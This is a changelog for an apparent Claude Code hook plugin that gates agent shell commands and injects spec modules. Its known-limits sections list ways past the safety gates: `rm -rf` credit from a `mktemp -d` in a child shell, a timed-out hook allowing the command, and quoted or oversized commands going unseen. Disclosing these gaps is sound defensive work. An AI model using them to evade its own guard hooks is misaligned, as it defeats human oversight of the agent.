- The other 0.104.0 `spec-module-gate` limits stand: quoted tag names, `bash -c '…'` bodies, `git tag x v1.2.3`, a path-qualified shell keyword read as the keyword (`/opt/bin/if git push --tags`), and the `发 <version>`, `(推送|合并)…发布` and `release … to npm` trigger false positives.
- `session-end-check` still reads a runner name as the command after a bundled or other value-taking `env` option (`env -iu vitest npm install`, `env -C vitest npm install`).
- `session-end-check` does not recognise `../node_modules/.bin/<runner>` or an absolute `…/node_modules/.bin/<runner>`, and like the bare runner names it counts `node_modules/.bin/jest --version`.
- Carried from 0.103.0 unchanged: `session-end-check`'s other validate recognition gaps, `~/.claude/spec-modules` as a symlink or a regular file, a foreign `*.md` with `triggers:` in that directory being injected, `/claudemd-update`'s preview not comparing modules, and the §8 rm gate crediting a `mktemp -d` that ran in a child shell (D#140).
- Two blocking events are still not counted by the banner or the trend: `reply-language-check`'s Stop block (`reply-language-restate`) and `spec-module-gate`'s PreToolUse deny under `SPEC_MODULE_GATE=deny`.

## [0.104.0] - 2026-09-28

**Upgrade notes — module triggers match English words next to Chinese text; core, extended, every module body and the §8 gates are unchanged (spec still v7.1.0; only the `triggers:` frontmatter line of six modules changes).** (1) `spec-module-inject` now injects `debug`, `plan`, `review`, `orchestrate` and `memory` when their English trigger word sits directly beside CJK text (`这个bug怎么修`, `测试failing了`, `三个l3事项`) or beside a non-ASCII letter (`émigration`); it no longer injects `ship` for `ship_date`, `deploy_utils` or `ship2`, and no longer injects `debug` for a typo fix followed directly by CJK (`fix the typo在README里`), which the typo exclusion now covers in jq too. (2) `spec-module-gate` (default `SPEC_MODULE_GATE=log`: a telemetry row, no visible effect) recognises a few more release command spellings; a replay of 4,303 transcript commands moved no verdict against 0.103.0. (3) The SessionStart summary banner's `denies` count now includes `deny-repeat`, `deny-prose` and sandbox-disposal's Stop `block`, so it can read higher than before for the same activity. To turn injection off: `DISABLE_SPEC_MODULE_INJECT_HOOK=1`. To go back to 0.103.0, follow `docs/ROLLBACK.md` ("Local machine needs the previous version back").

**Module triggers: English words are bounded the same way in jq and JS (D#142 LOW-13, LOW-3).** jq, the hook's regex engine, counts a CJK character as a word character, so `\bbug\b` never matched `bug` glued to Chinese, while the JS copy used for calibration did; and 0.103.0's `(?<![A-Za-z])` bound on the `ship` arms accepted `_` and digits beside the word. Every English arm that was bounded (by `\b`, or by `(?<![A-Za-z])` in `ship`) is now written `(?<![A-Za-z0-9_])word(?![A-Za-z0-9_])`, the same text in both engines; the unbounded arms (`code review`, `stack ?trace`, `fan out`, `npm publish`, `gh release`, `create-release`, `merge-and-push`, and `tag` in `打\s*tag`) are unchanged.
- On the 757 interactive human prompts on the maintainer's machine since 2026-09-05 (the calibration script's filter), each matched in the window the hook reads (the first 300 characters, whole prompt for `ship`): prompts drawing `debug` 93 → 100 and `plan` 35 → 36; `ship`, `review`, `orchestrate` and `memory` unchanged; no prompt lost a match; prompts drawing two or more modules 50 → 51 (6.6% → 6.7%). jq/JS disagreements on the same prompts: 8 → 0. Outside CJK, `_` and digits the engines can still differ (Oniguruma folds the Kelvin sign and long s into `[A-Za-z]`, and its `.` matches `\r`); none of that occurs in these prompts.

**`spec-module-gate` reads more release spellings (D#142 LOW-1, LOW-5, LOW-6).**
- A redirection glued to the version (`git tag v1.2.3>/dev/null`), which 0.102.0 recognised and 0.103.0 did not: a `<`, `>` or `>>` redirection (with a descriptor after a space, or a `&` target: `2>&1`, `>/dev/null`, `> log`, `<in`) is now removed with its target before the command is read, wherever it sits, so `git push 2>/dev/null origin v1.2.3` is still a release and `npm publish >/dev/null --dry-run` still is not. `&>`, `&>>` and `>|` are not removed; see Known limits.
- A version tag on the destination side of a refspec (`git push origin HEAD:refs/tags/v1.2.3`) is a tag push; an empty source (`:refs/tags/v1.2.3`) is still a deletion. `git push --mirror` counts like `--tags`. Command prefixes are matched by basename, so `/usr/bin/timeout`, `/usr/bin/env` and `/usr/bin/sudo` are skipped like their bare forms.
- The bundled-short-option scan stops at 64 letters. A 20,000-letter option took 2,975 ms against the 3 s hook timeout; it now takes 82 ms.
- A replay of the 4,303 distinct transcript commands on the maintainer's machine (subagent sessions included) that name git/gh/npm and tag/push/release/publish gives the same verdict for every command as 0.103.0 (268 release, 4,035 not): these spellings did not occur there.

**The summary banner and the rule-usage trend count the deny family and sandbox-disposal's `block` (D#77).** The banner's `denies` matched the literal event `deny`, so ship-baseline's `deny-repeat`, banned-vocab's `deny-prose` and sandbox-disposal's opt-in Stop `block` were left out; it now counts the deny family as `scripts/lib/rule-hits-parse.js` does (`deny-prose-dry-run`, which does not block, stays out) plus `block`. `block` is also counted by the sparkline trend, which already counted the same hook's `warn`.

**Known limits.**
- `spec-module-gate` still does not see quoted tag names or `bash -c '…'` bodies, and reads `git tag x v1.2.3` (a tag on a commit named like a version) as a release. The `发 <version>` arm still fires after 分 转 下 头 并, `(推送|合并)…发布` on 推送通知发布, and `release … to npm` on "added to npm docs".
- Two blocking events are still not counted by the banner or the trend: `reply-language-check`'s Stop block (`reply-language-restate`) and `spec-module-gate`'s PreToolUse deny under `SPEC_MODULE_GATE=deny` (its row is `module-unread`).
- `spec-module-gate` does not remove `&>`, `&>>`, `>|`, or a descriptor glued to `;` or `(` (`true;2>/dev/null git push …`), so words after one are still misread as in 0.103.0 (`git push &>/dev/null origin v1.2.3` is missed; `npm publish &>/dev/null --dry-run` is read as a release). A glued `>|` before `--dry-run`, `-n`, `-d` or `--help` (`npm publish>|log --dry-run`) is now read as a release where 0.103.0 was not. None of these occurs in the 4,318 transcript commands replayed; the gate only logs by default.
- A first word of about 100,000 characters still pushes `spec-module-gate` past its 3 s timeout (a killed hook allows), as in 0.103.0.
- `tests/hooks/spec-module-gate.test.sh` case 15 reads bash's `time` output with a `.` decimal point and fails under a comma-decimal locale (`LC_NUMERIC=de_DE.UTF-8`).
- `spec-module-gate` reads a path-qualified shell keyword (`/opt/bin/if git push --tags`) as the keyword.
- Carried from 0.103.0 unchanged: `session-end-check`'s validate recognition gaps, `~/.claude/spec-modules` as a symlink or a regular file, a foreign `*.md` with `triggers:` in that directory being injected, `/claudemd-update`'s preview not comparing modules, and the §8 rm gate crediting a `mktemp -d` that ran in a child shell (D#140).

## [0.103.0] - 2026-09-28

**Upgrade notes — three hooks change what they match; the §8 gates, core, extended and every module body are unchanged (spec still v7.1.0; only `ship.md`'s `triggers:` frontmatter line changes).** (1) `spec-module-gate` (default `SPEC_MODULE_GATE=log`, so a telemetry row and no visible effect) recognises a different set of release commands; `module-unread` rows before and after this version are not comparable counts (`docs/RULE-HITS-SCHEMA.md`). (2) `spec-module-inject` injects `ship.md` for more release wordings, and neither it nor `memory-prompt-hint` reacts to teammate messages any more. Opt-outs: `DISABLE_SPEC_MODULE_INJECT_HOOK=1`, `DISABLE_SPEC_MODULE_GATE_HOOK=1`, `DISABLE_MEMORY_HINT_HOOK=1`. To go back to 0.102.0: `docs/ROLLBACK.md`, "Local machine needs the previous version back".

**`spec-module-gate` parses release commands (D#110).** 0.101.0's single regex matched across separators and missed `git tag -f`/`-am`/`--annotate`, git global options other than `-C`, `git push --follow-tags`, tag names without a leading `v` in `refs/tags/` and `tag <name>` refspecs, `-rc` versions on push, npm global options and command prefixes. The command is now split into simple commands, prefixes (`VAR=x`, `env`, `sudo`, `timeout`, `nice`, `nohup`, shell keywords) are skipped, and `git tag`, `git push`, `gh release create` and `npm publish` are parsed argument by argument. A tag counts when its name ends in a dotted version (`v1.2`, `2.0.0-rc.1`, `pkg@2.0.0`, `cli-v2.0.0`); a pushed bare refspec must be the version alone, so `git push origin v2` and branches such as `release/0.13.0` are not releases, and the first word after `git push` is always the repository (an scp-style `192.168.1.10:repo.git` is not a version). `--dry-run` exempts only its own command, and `--help` / `-h` is not a release. Advisory mode no longer tells the model to run the (allowed) command again.
- Replay of the 4,853 distinct transcript commands on the maintainer's machine that name git/gh/npm and tag/push/release/publish, against 0.102.0: 27 verdicts change. 22 `git push origin main --follow-tags` are now recognised; three tag deletions, one cross-separator match and one `npm publish --help` no longer are. Tag names without a version (test fixtures, probes, archive markers) and a version after `/` (branches) were an early draft's false positives and are negative rows.
- A line of many simple commands is filtered in awk before the per-command parser runs, so lines made of other commands cost what they did in 0.102.0. A line dense with candidates costs more: the pre-tag review measured 2,000 × `git tag -l` at 27–63 ms on 0.102.0 and 240–296 ms here, while 2,000 × `git push origin main` went from about 700 to about 390 ms; all far inside the 3 s hook timeout.

**`ship.md` is injected for more release wordings.** The trigger adds `发 <version>` (`发 v6.17.0`, `推送并发 0.99.0`; not after 开 触 研 出 批 激 散 引, so `开发 2.0` is not a release), `推送/合并 … 发布`, `create-release`, `merge-and-push` and `release … to npm`. English words are now bounded with `(?<![A-Za-z])` / `(?![A-Za-z])` instead of `\b`, which jq (the hook's engine) reads differently next to CJK: `ship一下` and `帮我deploy一下` were missed. On the 748 human prompts in transcripts modified since 2026-09-05, measured 2026-09-27 (reruns count more as transcripts grow; the deltas held at 743 and 753), ship recall — sessions that ran a release command with an earlier ship-matching prompt — goes from 106/139 to 112/139, and 172 prompts match ship (160 with the 0.102.0 trigger). jq and the JS calibration copy agree on every historical prompt and on the constructed CJK-adjacent rows in `tests/hooks/spec-module-inject.test.sh`.

**Teammate messages are not prompts.** A message from another Claude session reaches `UserPromptSubmit` as a user turn starting `Another Claude session sent a message: <teammate-message …>`. Neither `spec-module-inject` nor `memory-prompt-hint` skipped it: of 711 such turns from 2026-09-05 to 2026-09-27, 256 matched a module trigger. Both skip it now; `memory-prompt-hint` logs it as `suppress-source`.

**Smaller fixes (D#96).** A user text block whose `text` is an object or array no longer makes the shared `is_user_turn` jq throw, which had silenced `session-end-check` for the session (the JS twin already read it as empty). `paused.md`'s "Last mutation tool call(s)" lists the last files in recorded order; `unique` sorted them. `rework-breaker` gains a test for the path where the second file's ledger append fails; it runs where `ulimit -f` stops an append (Linux CI) and prints a SKIP where it does not (the macOS CI legs).

**Correction to 0.102.0.** Its trigger-calibration counts ("1,450 human prompts", 93 / 100 debug matches) included 711 teammate messages; the human-only base was about 740 prompts at that date (`tasks/specs/spec-modules.md` r6).

**Known limits.**
- The §8 rm gate still credits a `D=$(mktemp -d)` that ran in a child shell (`(D=$(mktemp -d)); rm -rf "$D/x"`), as in 0.102.0 (D#103). A fix was built and reverted before this release: it moved no real command's verdict, and two review rounds found it could push the hook past its 3 s timeout (a killed hook allows) and could be switched off by an escaped quote earlier in the command.
- `spec-module-gate` does not see into `bash -c '…'` bodies or quoted tag names; it reads `git tag x v1.2.3` (a tag on a commit named like a version) as a release; it misses a destination-side `HEAD:refs/tags/v1.2.3`, `refs/tags/*`, `--mirror`, a path-qualified prefix (`/usr/bin/timeout`) and a redirection glued to the name (`git tag v1.2.3>/dev/null`, which 0.102.0 recognised); and a bundled short option tens of thousands of characters long pushes it past its 3 s timeout. The gate only logs by default.
- The ship trigger's `(?<![A-Za-z])` bound accepts `_` and digits beside a word (`ship_date`, `deploy_utils.py`), and `发 <version>` also fires after 分 转 下 头 并; none of these occur in the historical prompts.
- Left from D#110 (now D#142, which also carries the two items above): `npm run`'s own value options and `env -u` / quoted spaced values in `session-end-check`'s validate recognition, `~/.claude/spec-modules` as a symlink or a regular file, a foreign `*.md` with `triggers:` in that directory being injected, and `/claudemd-update`'s preview not comparing modules.

## [0.102.0] - 2026-09-27

**Upgrade notes — spec v7.1.0: core names the module it points at, one rule is removed and one narrows.** (1) Core §9's Parallel-first bullet is removed: Claude Code's own system prompt tells the model to batch independent tool calls. (2) Core §2.1 now sends `2+ sizeable disjoint tasks` to `Agent`, as §11-O in `orchestrate.md` already said. (3) Core points at modules by file name (`verify.md`, `auth.md`, …) where it wrote `§EXT §N`. (4) After its yield list, the mid-turn stop clause in core §11 now names two stops that are not yields — a progress summary, a next step announced instead of taken — in place of "natural-feeling stop points"; its yield conditions and Tell keep their meaning. (5) `debug.md` is no longer injected when typo(s), spelling, 错别字 or 拼写 directly follows "fix the" or 修复 ("Fix the typo …", 修复错别字); the misses are listed below. Every other rule keeps its meaning and its ID. To go back to 0.101.0, follow the same order as 0.101.0's notes: make the plugin Claude Code loads 0.101.0 first, then run the downgrade install (`docs/ROLLBACK.md`, "Local machine needs the previous version back").

**Spec v7.1.0.** Design record `tasks/specs/v7.1-core.md`; spec-level detail and the commands behind each count in `spec/CLAUDE-changelog.md`.
- Core 24,990 → 24,740 B (260 B headroom, from 10); `§` in core 140 → 93; `§EXT` mentions 26 → 2.
- Also removed from core: three pointer-only lines and the §1.5 "Core-resident" label. The cross-session pointer stays (it now names `orchestrate.md`).
- `debug` trigger misses, both ways: an adjective before the word (`Fix the README typo`, `Fix a few typos`, 修复这个错别字, 修复文档里的错别字), a space or English after 修复 (`修复 错别字`, `修复typo`) and, in the hook only, CJK right after the word (`fix the typo在README里`) still draw `debug.md`; a tool named after the word (`Fix the spelling checker …`, 修复拼写检查器) does not. The hook matches with jq, where `\b` counts a CJK character as a word character: on 1,450 human prompts since 2026-09-05 the trigger matches 93 in jq and 100 in the JS calibration copy, the same before and after this change.
- The planned move of the delegation default into core was dropped on data. With coordinator mode stripped from the harness (below), v7.0.0 spawned 0 subagents in 15/15 runs of an L1 bugfix, a multi-file rename and a where-is-X question; and of about 491 main-session spawns in interactive sessions since 2026-09-05 (an ad-hoc scan, not in the repo), 397–416 were reviews or audits depending on the keyword classifier. The audit's 43.1% was the share of tool calls made inside subagents, which reviews dominate.
- Not done: the planned ≤ 23,800 B core. Reaching it means moving about 600 B of rules into modules, and a rule in a module that the task does not trigger is not read (the 0.101.0 delegation A/B).

**Offline eval harness: runs no longer inherit coordinator mode.** `CLAUDE_CODE_COORDINATOR_MODE=1` in the maintainer's shell reached every `claude -p` run, which left main with six tools and no Read/Edit/Bash, so every task went through a worker agent. The 0.101.0 A/B figures were measured that way. `scripts/offline-eval/run.mjs` now drops that variable, the launching session's variables (`CLAUDECODE`, `CLAUDE_CODE_CHILD_SESSION`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_*`, …) and `CLAUDE_EFFORT` (the run passes `--effort` itself), records main's tool list per run, and flags a main without Bash. The maintainer's opt-in hook flags still pass through, identically in both arms. Two tasks added: T9 (a multi-step, multi-file change finished in one turn) and T10 (a where-is-X question); a new test keeps the calibration copy of the module triggers equal to `spec/spec-modules.json`.
- **First A/B** (Opus 5.5 high, five runs per task per arm; A = v7.0.0, B = the pre-review v7.1.0 build; T7 not run): T2, T3, T4, T8, T9 and T10 5/5 in both arms; T1 (typo) 5/5 in both, with `debug.md` injected in 5/5 A runs and 0/5 B runs; T5 (ship) A 5/5, B 4/5 — the miss stopped to ask what a release with no changes should say, with review-before-tag in its plan; T6 (review a diff) 0/5 in both: each run reviewed the diff itself and found the real defect (`avg([])` throws), and no run spawned the fresh subagent the task expects, so the design record's T6 guardrail was not met in either arm.
- **Re-run after the first pre-tag review's repairs** (the build at e76d530; T1, T4, T5, T8, T9 × 5): 25/25, `debug.md` injected 0/5 in T1, one reviewer before the tag in each T5 run. The second review's repairs (the cross-session pointer kept, "shall I continue?" dropped from the named stops) came after this run.

**`spec-coherence-audit`**: the ext-cross-refs check also requires every backticked lowercase `name.md` core points at to be a module registered in `spec/spec-modules.json`; a pointer to an unregistered module is CRITICAL. It does not check that the module holds the section the sentence means.

## [0.101.0] - 2026-09-27

**Upgrade notes — spec v7.0.0: the extended spec arrives in per-phase modules, and one new hook is on by default.** The rules keep their meaning and their IDs; what changes is how they reach a session. (1) Core §2.2 is now an index of 11 modules installed under `~/.claude/spec-modules/` (ship, review, debug, verify, plan, skills, orchestrate, memory, auth, modes, session), each saying when to read it, instead of a list of reasons to read the whole 48 KB `CLAUDE-extended.md`. `CLAUDE-extended.md` is still installed in full, as the modules' build source. (2) **New, on by default: `spec-module-inject`** (UserPromptSubmit). When a prompt matches a module's triggers, the module's body is added to the session as context: at most two modules per prompt, each at most once per session (again after a compaction). Turn it off with `DISABLE_SPEC_MODULE_INJECT_HOOK=1`. (3) New, default `log`: `spec-module-gate` writes one rule-hits row when a release command it recognises (`git tag v1.2.3`, optionally with `-a`, `-s` or `-m`; `git push` with `--tags` or a `v1.2.3` argument; `gh release create`; `npm publish`) runs in a session that never received `ship.md`; `SPEC_MODULE_GATE=advisory` adds a note, `deny` refuses the command, `off` or `DISABLE_SPEC_MODULE_GATE_HOOK=1` silences it. (4) The upgrade-available and stale-registration notices now reach you instead of only the model. To stop the injection and keep the rest, set `DISABLE_SPEC_MODULE_INJECT_HOOK=1`. A full revert to 0.100.0 has an order: the plugin Claude Code loads must be 0.100.0 first, because the 0.101.0 SessionStart installs spec v7.0.0 again; then run the downgrade install (`docs/ROLLBACK.md`, "Local machine needs the previous version back").

**Spec v7.0.0 — modules (major: the loading protocol changes).** Source: `docs/audit/20260926-180700.md` §10 and `tasks/specs/spec-modules.md`. Measured before the change: the extended spec was read whole in 50–65% of sessions whatever the task, and a hook hint to read a file was followed in 25 of 46 Opus 5.5 turns, so tier 2 injects a module's text instead of pointing at it.
- `spec/CLAUDE-extended.md` stays the single source. Marker lines assign its sections to modules; `scripts/build-spec-modules.js` writes `spec/spec-modules/<name>.md` (47,045 B for all 11, the largest 8.3 KB) and `--check` fails when the committed modules differ from the build. `spec/spec-modules.json` holds each module's index line and triggers.
- Triggers were calibrated on 1,426 human prompts from 191 local sessions: 4.3% match two or more modules, the median prompt matches none. `ship` matches the whole prompt; the others match its first 300 characters.
- The installer, `/claudemd-update`, `/claudemd-uninstall`, `doctor`'s spec-hash rows and the session-start drift banner treat the module directory as part of the spec. Install and update write a module only when its bytes differ, remove a stale `*.md` and leave other files alone; uninstall removes the modules only with `CLAUDEMD_SPEC_ACTION=delete`.
- **Offline A/B before release** (`scripts/offline-eval/`, eight fixed tasks through `claude -p`, Opus 5.5, five runs per task per arm, v6.36.0 as arm A): A passed 34/40, B 37/40. The AUTH task and the §8 `rm -rf` task went 5/5 in both arms, and no task in B fell more than one run below A. Spec text reaching a session beyond core fell from 9,972 bytes per run (extended read whole) to 2,117 (module reads plus injections). The first B build tagged a release before any review in 4 of 5 ship runs (A: 0; A's ship task passed 1/5): `ship.md` pointed at the review rule "above", which had moved to `review.md`. `ship.md` now states the pre-tag review and points at `review.md` (a second pointer of the same kind, `review.md`'s "Detection below", now names `skills.md`); rebuilt, the ship task went 3/5 with no tag before a review (the other 2 declined to release a version with no changes, as A's runs did).
- Not in v7.0: core is 24,990 B, not the 20 KB the plan targeted (the index took the old §2.2's place; two pointer lines removed from §11 paid for the difference); §4's routing table still sits beside §12's in `skills.md`; `CLAUDE-extended.md` is not yet a short stub. These wait for v7.1.

**Spec v6.36.0 (never released on its own; included here).** Twenty-two corrections from a prompt audit of the spec against Opus 5.5 — stale facts, four disagreeing lists of when to load extended reduced to one, history and audit IDs removed from text the model reads — and one relaxed route: `gs:/browse` is reached through the `gstack` router, the sub-skill name Claude Code does not register. §0.1 (the byte cap, enforced by `spec-coherence-audit` and `version-cascade-check`) moves from core to extended §13. Core §1's language default is a user-level rule, else English. Two behaviour changes: §11-O's delegation defaults, written for Opus 4.x, now delegate only large independent work and drop the per-batch review spawn (in the offline A/B this changed nothing measurable, because none of the small tasks read the section); and core §10 now says to state a rule to the user in plain words and cite its § number only when asked. Full list: `spec/CLAUDE-changelog.md`.

**Notices reach the reader they address.**
- The upgrade-available notice, both stale-registration notices, the bootstrap-failed notice and both user-content notices ask the user to act, but went out as `additionalContext` with `suppressOutput`, so only the model saw them. They now use the top-level `systemMessage` (checked interactively on Claude Code 2.1.283); the three that the model also needs keep `additionalContext` beside it.
- The ledger banner quotes the ledger body inside `<ledger path="…">` instead of mixing it into the hook's own prose, escapes a closing tag inside the body, and no longer says its decisions "were settled at task start".
- Model-facing hook text stops restating spec sections (the compaction reminder, the reply-language restate, the memory-hint cap line, the memory-read bypass note, the banned-vocab prose-scan reason).
- The compaction reminder and the missing-spec-file banner name the spec modules where they named the extended spec, which core v7.0.0 says not to read whole.

**`session-end-check`: more real test runs count, fewer non-tests do.** Counted now: `timeout -k N …`, `env VAR=value …` and `nice -n N …` wrappers, a quoted assignment value, npm's own options before the verb (`npm --prefix pkg test`), `uv`/`poetry`/`pipenv run`, and `bash -c '…'` bodies. Before the verb, npm's value-taking options (`-C`, `-w`, `--prefix`, `--workspace` and ten more) consume their value, so `npm --prefix test install` is not a test run. A script name counts when a `:`/`.`/`_`/`-`-separated segment is a check word, so `npm run publish:latest` no longer does. A root of `/` now holds every absolute path, and `..` segments are resolved before the root test. Replay over 31,931 local Bash commands: 8,691 → 8,692 validations (7 gained, 6 lost; a lost match writes a checkpoint, the safe side).

**`pre-bash-safety`: deny text only, no verdict change.** With an intact `hooks/lib/`, a replay of 859 corpus rows and 89 crafted commands through the 0.100.0 and 0.101.0 hooks gave 0 differences (pre-tag review); a pre-tag fix keeps that true when `hook-common.sh` is truncated, where the new commit/tag-message line aborted the hook before its deny. The rm deny now warns that the credit a `mktemp -d` in the same command gives can be withdrawn, naming `export`, `unset`, another assignment, `source`/`eval` and `IFS=`, and tells the reader to guard the variable then. The list is approximate: the gate withdraws the credit for any `source`, `.`, `eval` or `IFS=` in the command, whether or not the variable appears, and not for every use it names. The text also restores the loop spelling a loop over a guarded base needs. The commit/tag-message line is shown for `git -C <dir> commit` too.

**`doctor`.** New advisory `routing:gstack-reachable`: each `gs:` primary in the installed routing table is reachable if registered by name or held by a registered `gstack` router, whether gstack is installed as a skill directory or as a plugin. The two routing checks share one registered-skill lookup.

**Commands.** Descriptions say what each command is for and leave the rules to the body. `/claudemd-sampling-audit` forwards the flags its table documents, and `/claudemd-audit` honours its day count (both used a placeholder Claude Code does not substitute; bodies now use `$ARGUMENTS`). `/claudemd-uninstall`'s description says which variable deletes spec files (`CLAUDEMD_SPEC_ACTION=delete` with `CLAUDEMD_CONFIRM=1`) and which wipes state (`CLAUDEMD_PURGE=1`).

**For maintainers of this repo.**
- `scripts/claim-drift.js --range=A..B` lists the prose lines outside a diff that mention a name the diff changed (hooks, scripts, env names, flags, rule-hits events) — a candidate list for the pre-tag review, not a gate.
- `scripts/offline-eval/` runs spec arms through `claude -p` on eight fixed tasks, isolated with `--setting-sources project` and a sandbox `HOME`, and scores each run from its transcript and the fixture's end state; `trigger-calibrate.mjs` measures module triggers on historical prompts.
- `.claude/agents/release-reviewer.md` fixes the pre-tag reviewer's model, effort, worktree isolation and rules; `.claude/rules/spec-edit.md` and `hook-shell.md` load only when an agent reads a matching file.
- A contract test joins every `extra` field documented in `docs/RULE-HITS-SCHEMA.md` to an emitter that writes it.

**Known limits.**
- The `memory-read-check` gaps listed under 0.100.0 remain. A fix (a32a035) was reverted before release: its jq segmenter ran about 6× slower than the split it replaced (0.37 s → 2.51 s on 464 KB of commands), inside a 3 s hook budget where a timeout loses the deny.
- `/claudemd-update`'s preview (the default, no writes) compares the four spec files only, so a module edited by hand shows no difference there; `CLAUDEMD_UPDATE_CHOICE=apply-all` restores it. The command body and doctor's module row now say so.
- `spec-module-gate` counts a Read or a Bash read of `~/.claude/spec-modules/ship.md` and an injection. A session that learned the ship rules another way (reading `CLAUDE-extended.md` whole, or the repo's `spec/spec-modules/ship.md`) is logged as unread, and a Bash read is detected the way `memory-read-check` detects it, with the same gaps.
- `spec-module-gate` does not recognise `git tag -f`, `git tag -am`, `git tag -a -F FILE v1.2.3` or `-u KEY` before the name (`git tag -a v1.2.3 -F FILE` is recognised), `--annotate`, tags not named `v…`/digits, `git push --follow-tags`, `refs/tags/…`, a `v1:v1` refspec or a `-rc` suffix on a pushed tag, git global flags other than `-C`, `npm --prefix … publish`, or a command behind `env`, `sudo`, `timeout` or an assignment. It logs `git push origin v2` for a branch named `v2`, `git push --dry-run --tags`, a `git push` followed by another command containing `--tags` or a `v1.2` word, and `git tag 2>/dev/null` (a listing); `--dry-run` anywhere in a command exempts an `npm publish` in it. In the default `log` mode these change only which rows are written, and the rows are the data for deciding whether to turn the gate on. `advisory` mode's note ends "run the command again" although the command was allowed.
- `spec-module-inject` skips machine-sent turns by prefix; a `<teammate-message>` turn is not among them. Re-injection after a compaction needs `session-start-check`, which clears the per-session list. A `*.md` a user puts in `~/.claude/spec-modules/` with `triggers:` frontmatter is injected like a shipped module. A symlinked or non-directory `~/.claude/spec-modules` is not handled: install writes through the link or stops partway.

## [0.100.0] - 2026-09-26

**Upgrade notes — fewer false checkpoints and denies, and hook text written for whoever reads it.** `session-end-check` (on by default) stops writing `tasks/session-end-<sid>-paused.md` for edits outside the project and for test runs it did not recognise; `memory-read-check` stops denying ship commands whose memory file was read with `cat`, read-only `gh` queries, and plumbing words that matched a memory tag. Advisory and deny texts change wording only; no verdict changes. The spec is unchanged at v6.35.0. Revert path: pin 0.99.0.

**`session-end-check`: only project changes count, and more test commands count as validation.** Seen in a claude-mem-lite session: the release was committed and pushed, then one auto-memory Edit produced "12 unvalidated mutations" and a checkpoint. Two causes, fixed separately.
- An edit counts as a mutation only when its path is under a project root (the cwd, its `pwd -P`, its git toplevel, or `CLAUDE_PROJECT_DIR`, taken together). Paths under `~/.claude/` and `/tmp/claude-<uid>/` stay excluded even under a root, unless the root itself is inside that zone. Relative or missing paths still count. 994 of 7,731 local Edit/Write targets were in those zones.
- A validation command may now start with `(`, `time`, `VAR=value`, `timeout N` or a runner (`npx`, `pnpm`/`yarn`/`npm exec`, `bunx`, `python -m`). npm/pnpm/yarn/bun scripts whose name contains test, lint, typecheck, check, smoke, verify or validate count (so `lint:fix` and `publish:latest` count too), as do make targets, `cargo check`, `cargo fmt --check`, `prettier --check` and biome. The command-position anchor stays. Over 30,372 local Bash commands, 4,758 read as validations before and 8,269 after; the 13 that stopped counting are all quoted mentions such as `grep "…\|npm test"`.
- The stderr line and the checkpoint now lead with the changes made after the last validation, and the recent-files list drops files a later validation covered. Replaying 196 local transcripts, 5 of the 10 that wrote a checkpoint had over-reported (54 reported, 27 open). The trigger condition is unchanged. The `session-end` rule-hits row gains `extra.open`; `docs/RULE-HITS-SCHEMA.md` now documents the row's fields.

**`memory-read-check`: 49 → 9 denies on the logged history.** All 62 logged denies (51 with a transcript) were replayed through the old and new hook in a sandbox HOME. Every flip has one of three causes:
- A memory file read through Bash (`cat`, `sed -n`, `head`, `tail`, `less`, `more`, `bat`, `nl`) now counts as read, provided that tool call has a non-error result. The gated call itself, or a denied `cat`, does not count.
- `gh release|pr list|view|status|checks|diff` no longer fire the trigger: they publish nothing.
- A plumbing command name at command position and followed by a space (`tail -2 log`, `sleep 15`, `grep …`, `timeout …`) no longer matches a memory tag of the same name; the same word as an argument still matches, and so does one followed directly by `;` or `|`.

**Hook text.**
- The rm-only deny message drops from about 1.8K to about 0.9K characters. The line about commit and tag messages now appears only when the command is a commit or tag. Before shipping, 60 historical rm denies were replayed through `claude-opus-5-5` with each text and the retry was scored by this hook: 57/60 retries passed with the old text, 59/60 with the new; none of the 180 retries added a bypass token or kill switch.
- Model-facing advisories said "Disable: DISABLE_X=1", which reads as an option for the agent. The model-facing clauses now name the switch as the user's ("the user can turn this off with DISABLE_X=1"); stderr lines, which only the human sees, keep the old form. `branch-prune` no longer tells the model to delete branches after every fetch, and `tmp-sweep` no longer tells it to delete files.
- `evidence-gate` and `ledger-staleness` print to stderr with exit 0, which reaches the human and not the model, yet ended with an order to the model. The last line now says the note is for the reader and what to ask the agent for. The channel stays human-only: a replay over 1,747 historical turn ends fired 21 times, and at most 3 of the 21 were a completion claim without verification.

**Known limits, found in the pre-tag review and left for a later release.** None touches a §8 verdict; the first can let a ship command through the memory-read check that 0.99.0 denied.
- `memory-read-check` finds a Bash read by splitting the command at `;`, `&`, `|` and newlines, so a reader word inside a quoted string, a heredoc body or a comment also counts as a read (`echo "note; cat <file>"`), and so do reads that print nothing (`cat <file> >/dev/null`, `tail -n 0 <file>`).
- The shorter rm-only deny text says a `mktemp -d` in the same command passes without naming what withdraws that credit (`export`, reassignment, `source`/`eval`, `IFS=`); the gate itself still applies those conditions. Its commit/tag line is not shown for `git -C <dir> commit`.
- `session-end-check` does not recognise `bash -c '… npm test'` (0.99.0 did), `timeout -k`, `env …`, `npm --prefix`/`-w`, or `uv run pytest` as validations; with `cwd=/` no absolute-path edit counts, and `..` in a path is not normalised.

**Docs.** `docs/audit/20260926-180700.md` records a prompt audit of the spec and configuration against Opus 5.5 and the batched plan that follows it. The project `CLAUDE.md` atomic-ship line now names the pre-tag review yield instead of contradicting the extended spec.

## Older releases

Entries for 0.99.0 and earlier (2026-04-21 to 2026-09-26) are in the GitHub Releases of each tag and in git history: `git show v0.122.1:CHANGELOG.md`.
